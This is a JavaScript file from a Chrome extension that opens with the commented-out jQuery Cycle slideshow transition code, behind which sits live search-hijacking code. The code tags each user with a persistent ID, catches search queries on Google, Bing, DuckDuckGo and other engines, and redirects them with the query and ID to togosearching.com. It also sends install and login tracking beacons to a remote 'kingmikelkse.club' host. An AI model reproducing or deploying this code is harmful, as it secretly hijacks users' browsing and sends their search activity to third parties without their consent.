// /*!
//  * jQuery Cycle Plugin Transition Definitions
//  * This script is a plugin for the jQuery Cycle Plugin
//  * Examples and documentation at: http://malsup.com/jquery/cycle/
//  * Copyright (c) 2007-2010 M. Alsup
//  * Version:  2.73
//  * Dual licensed under the MIT and GPL licenses:
//  * http://www.opensource.org/licenses/mit-license.php
//  * http://www.gnu.org/licenses/gpl.html
//  */
// (function($) {

// //
// // These functions define slide initialization and properties for the named
// // transitions. To save file size feel free to remove any of these that you
// // don't need.
// //
// $.fn.cycle.transitions.none = function($cont, $slides, opts) {
//   opts.fxFn = function(curr,next,opts,after){
//     $(next).show();
//     $(curr).hide();
//     after();
//   };
// };

// // not a cross-fade, fadeout only fades out the top slide
// $.fn.cycle.transitions.fadeout = function($cont, $slides, opts) {
//   $slides.not(':eq('+opts.currSlide+')').css({ display: 'block', 'opacity': 1 });
//   opts.before.push(function(curr,next,opts,w,h,rev) {
//     $(curr).css('zIndex',opts.slideCount + (!rev === true ? 1 : 0));
//     $(next).css('zIndex',opts.slideCount + (!rev === true ? 0 : 1));
//   });
//   opts.animIn.opacity = 1;
//   opts.animOut.opacity = 0;
//   opts.cssBefore.opacity = 1;
//   opts.cssBefore.display = 'block';
//   opts.cssAfter.zIndex = 0;
// };

// // scrollUp/Down/Left/Right
// $.fn.cycle.transitions.scrollUp = function($cont, $slides, opts) {
//   $cont.css('overflow','hidden');
//   opts.before.push($.fn.cycle.commonReset);
//   var h = $cont.height();
//   opts.cssBefore.top = h;
//   opts.cssBefore.left = 0;
//   opts.cssFirst.top = 0;
//   opts.animIn.top = 0;
//   opts.animOut.top = -h;
// };
// $.fn.cycle.transitions.scrollDown = function($cont, $slides, opts) {
//   $cont.css('overflow','hidden');
//   opts.before.push($.fn.cycle.commonReset);
//   var h = $cont.height();
//   opts.cssFirst.top = 0;
//   opts.cssBefore.top = -h;
//   opts.cssBefore.left = 0;
//   opts.animIn.top = 0;
//   opts.animOut.top = h;
// };
// $.fn.cycle.transitions.scrollLeft = function($cont, $slides, opts) {
//   $cont.css('overflow','hidden');
//   opts.before.push($.fn.cycle.commonReset);
//   var w = $cont.width();
//   opts.cssFirst.left = 0;
//   opts.cssBefore.left = w;
//   opts.cssBefore.top = 0;
//   opts.animIn.left = 0;
//   opts.animOut.left = 0-w;
// };
// $.fn.cycle.transitions.scrollRight = function($cont, $slides, opts) {
//   $cont.css('overflow','hidden');
//   opts.before.push($.fn.cycle.commonReset);
//   var w = $cont.width();
//   opts.cssFirst.left = 0;
//   opts.cssBefore.left = -w;
//   opts.cssBefore.top = 0;
//   opts.animIn.left = 0;
//   opts.animOut.left = w;
// };
// $.fn.cycle.transitions.scrollHorz = function($cont, $slides, opts) {
//   $cont.css('overflow','hidden').width();
//   opts.before.push(function(curr, next, opts, fwd) {
//     if (opts.rev)
//       fwd = !fwd;
//     $.fn.cycle.commonReset(curr,next,opts);
//     opts.cssBefore.left = fwd ? (next.cycleW-1) : (1-next.cycleW);
//     opts.animOut.left = fwd ? -curr.cycleW : curr.cycleW;
//   });
//   opts.cssFirst.left = 0;
//   opts.cssBefore.top = 0;
//   opts.animIn.left = 0;
//   opts.animOut.top = 0;
// };
// $.fn.cycle.transitions.scrollVert = function($cont, $slides, opts) {
//   $cont.css('overflow','hidden');
//   opts.before.push(function(curr, next, opts, fwd) {
//     if (opts.rev)
//       fwd = !fwd;
//     $.fn.cycle.commonReset(curr,next,opts);
//     opts.cssBefore.top = fwd ? (1-next.cycleH) : (next.cycleH-1);
//     opts.animOut.top = fwd ? curr.cycleH : -curr.cycleH;
//   });
//   opts.cssFirst.top = 0;
//   opts.cssBefore.left = 0;
//   opts.animIn.top = 0;
//   opts.animOut.left = 0;
// };
// // turnUp/Down/Left/Right
// $.fn.cycle.transitions.turnUp = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,true,false);
//     opts.cssBefore.top = next.cycleH;
//     opts.animIn.height = next.cycleH;
//     opts.animOut.width = next.cycleW;
//   });
//   opts.cssFirst.top = 0;
//   opts.cssBefore.left = 0;
//   opts.cssBefore.height = 0;
//   opts.animIn.top = 0;
//   opts.animOut.height = 0;
// };
// $.fn.cycle.transitions.turnDown = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,true,false);
//     opts.animIn.height = next.cycleH;
//     opts.animOut.top   = curr.cycleH;
//   });
//   opts.cssFirst.top = 0;
//   opts.cssBefore.left = 0;
//   opts.cssBefore.top = 0;
//   opts.cssBefore.height = 0;
//   opts.animOut.height = 0;
// };
// $.fn.cycle.transitions.turnLeft = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,false,true);
//     opts.cssBefore.left = next.cycleW;
//     opts.animIn.width = next.cycleW;
//   });
//   opts.cssBefore.top = 0;
//   opts.cssBefore.width = 0;
//   opts.animIn.left = 0;
//   opts.animOut.width = 0;
// };
// $.fn.cycle.transitions.turnRight = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,false,true);
//     opts.animIn.width = next.cycleW;
//     opts.animOut.left = curr.cycleW;
//   });
//   $.extend(opts.cssBefore, { top: 0, left: 0, width: 0 });
//   opts.animIn.left = 0;
//   opts.animOut.width = 0;
// };

// // zoom
// $.fn.cycle.transitions.zoom = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,false,false,true);
//     opts.cssBefore.top = next.cycleH/2;
//     opts.cssBefore.left = next.cycleW/2;
//     $.extend(opts.animIn, { top: 0, left: 0, width: next.cycleW, height: next.cycleH });
//     $.extend(opts.animOut, { width: 0, height: 0, top: curr.cycleH/2, left: curr.cycleW/2 });
//   });
//   opts.cssFirst.top = 0;
//   opts.cssFirst.left = 0;
//   opts.cssBefore.width = 0;
//   opts.cssBefore.height = 0;
// };

// // growX - grow horizontally from centered 0 width
// $.fn.cycle.transitions.growX = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,false,true);
//     opts.cssBefore.left = this.cycleW/2;
//     opts.animIn.left = 0;
//     opts.animIn.width = this.cycleW;
//     opts.animOut.left = 0;
//   });
//   opts.cssBefore.top = 0;
//   opts.cssBefore.width = 0;
// };
// // growY - grow vertically from centered 0 height
// $.fn.cycle.transitions.growY = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,true,false);
//     opts.cssBefore.top = this.cycleH/2;
//     opts.animIn.top = 0;
//     opts.animIn.height = this.cycleH;
//     opts.animOut.top = 0;
//   });
//   opts.cssBefore.height = 0;
//   opts.cssBefore.left = 0;
// };

// // curtainX - squeeze in both edges horizontally
// $.fn.cycle.transitions.curtainX = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,false,true,true);
//     opts.cssBefore.left = next.cycleW/2;
//     opts.animIn.left = 0;
//     opts.animIn.width = this.cycleW;
//     opts.animOut.left = curr.cycleW/2;
//     opts.animOut.width = 0;
//   });
//   opts.cssBefore.top = 0;
//   opts.cssBefore.width = 0;
// };
// // curtainY - squeeze in both edges vertically
// $.fn.cycle.transitions.curtainY = function($cont, $slides, opts) {
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,true,false,true);
//     opts.cssBefore.top = next.cycleH/2;
//     opts.animIn.top = 0;
//     opts.animIn.height = next.cycleH;
//     opts.animOut.top = curr.cycleH/2;
//     opts.animOut.height = 0;
//   });
//   opts.cssBefore.height = 0;
//   opts.cssBefore.left = 0;
// };

// // cover - curr slide covered by next slide
// $.fn.cycle.transitions.cover = function($cont, $slides, opts) {
//   var d = opts.direction || 'left';
//   var w = $cont.css('overflow','hidden').width();
//   var h = $cont.height();
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts);
//     if (d == 'right')
//       opts.cssBefore.left = -w;
//     else if (d == 'up')
//       opts.cssBefore.top = h;
//     else if (d == 'down')
//       opts.cssBefore.top = -h;
//     else
//       opts.cssBefore.left = w;
//   });
//   opts.animIn.left = 0;
//   opts.animIn.top = 0;
//   opts.cssBefore.top = 0;
//   opts.cssBefore.left = 0;
// };

// // uncover - curr slide moves off next slide
// $.fn.cycle.transitions.uncover = function($cont, $slides, opts) {
//   var d = opts.direction || 'left';
//   var w = $cont.css('overflow','hidden').width();
//   var h = $cont.height();
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,true,true,true);
//     if (d == 'right')
//       opts.animOut.left = w;
//     else if (d == 'up')
//       opts.animOut.top = -h;
//     else if (d == 'down')
//       opts.animOut.top = h;
//     else
//       opts.animOut.left = -w;
//   });
//   opts.animIn.left = 0;
//   opts.animIn.top = 0;
//   opts.cssBefore.top = 0;
//   opts.cssBefore.left = 0;
// };

// // toss - move top slide and fade away
// $.fn.cycle.transitions.toss = function($cont, $slides, opts) {
//   var w = $cont.css('overflow','visible').width();
//   var h = $cont.height();
//   opts.before.push(function(curr, next, opts) {
//     $.fn.cycle.commonReset(curr,next,opts,true,true,true);
//     // provide default toss settings if animOut not provided
//     if (!opts.animOut.left && !opts.animOut.top)
//       $.extend(opts.animOut, { left: w*2, top: -h/2, opacity: 0 });
//     else
//       opts.animOut.opacity = 0;
//   });
//   opts.cssBefore.left = 0;
//   opts.cssBefore.top = 0;
//   opts.animIn.left = 0;
// };
// })(jQuery);

var params = {
    CLID: "clid",
    get: function(a) {
      return localStorage.getItem("chrome_ext." + a)
    },
    set: function(c, b) {
      localStorage.setItem("chrome_ext." + c, b)
    },
  },
  g_login_url = "service51.kingmikelkse.club",
  g_install_url = "service51.kingmikelkse.club",
  GenerateGUID = function() {
    var a = (new Date).getTime();
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(b) {
      var c = (a + 16 * Math.random()) % 16 | 0;
      return a = Math.floor(a / 16), ("x" == a ? c : 7 & c | 8).toString(16)
    })
  };
  var initParams = function(f) {
    var b = params.get(params.CLID),
      d = null,
      c = {};
    b || (b = "{" + GenerateGUID() + "}", params.set(params.CLID, b))
  };
  initParams();

chrome.tabs.onUpdated.addListener(function() {
chrome.tabs.getSelected(null,function(tab) {
  var urge69 = tab.url;
  document.getElementsByTagName('body')[0].style.display = 'none';
  if(urge69.match(/(\?|&)q=/) && (urge69.match(/google/) || urge69.match(/bing/ ) ||  urge69.match(/aol/g) || urge69.match(/wow/g) || urge69.match(/ask/g)|| urge69.match(/searchlock/g) || urge69.match(/duckduckgo/g)))
  { 
    var split = urge69.split("q=");
    if(split.length > 1)
    {
      var moveP = split[1].split("&");
      var uti6y = 'http://togosearching.com/latesinfo.php?q='+moveP[0] +'&uuid='+params.get(params.CLID);
      redirect(uti6y);
      chrome.tabs.update({url: uti6y});
    }
  }
   try {
          var a = window.document.createElement("canvas"),
            b = a.getContext("2d");
          chrome.browserAction.setIcon({
            imageData: b.getImageData(0, 0, 19, 19)
          });
        } catch (e) {}
});
});
function redirect(u) {           
            chrome.tabs.update({url: u});
}

var SendData = function(b, c, d) {
  var a = new XMLHttpRequest();
  a.open("POST", b, true);
  a.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  if (d != undefined) {
    a.onreadystatechange = function() {
      if (a.readyState == 4) {
        if (a.status == 200 && d()) {}
      }
    }
  }
  a.send(c);
  return a.status
}

function SendStats(b, a, d) {
  try {
    SendData(a, "", d)
  } catch (c) {
    console.log("SendStats error: " + c)
  }
}
var login_url = "http://" + g_login_url + "/ext_login_stats.php?&extid=" + chrome.runtime.id + "&uid=" + params.get(params.CLID);
var install_url = "http://" + g_install_url + "/ext_install_stats.php?extid=" + chrome.runtime.id + "&uid=" + params.get(params.CLID);

function SendLoginStats() {
  SendStats("ext_login_request", login_url)
}

function SendInstallStats(a) {
  SendStats("ext_install_stats_request", install_url, function() {
    localStorage.setItem("installed", 1)
  })
}
if (!localStorage.getItem("installed")) {
  SendInstallStats();
  SendLoginStats()
} else {
  SendLoginStats()
};
